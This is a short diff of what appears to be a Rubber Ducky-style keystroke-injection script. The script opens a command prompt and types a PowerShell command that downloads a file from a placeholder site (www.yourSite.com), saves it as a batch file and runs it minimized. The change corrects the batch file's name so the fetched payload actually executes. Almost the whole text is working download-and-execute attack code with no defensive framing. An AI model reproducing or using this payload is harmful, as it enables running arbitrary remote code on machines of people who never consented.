@@ -12,5 +12,5 @@ STRING cmd
 ENTER
 DELAY 350
 REM -- Change to location of hosted powershellScript.txt --
-STRING (powershell -Command "& {Invoke-WebRequest -Uri www.yourSite.com/powershellScript.txt -OutFile a.bat}") & start /min SMB.bat & exit
+STRING (powershell -Command "& {Invoke-WebRequest -Uri www.yourSite.com/powershellScript.txt -OutFile a.bat}") & start /min a.bat & exit
 ENTER
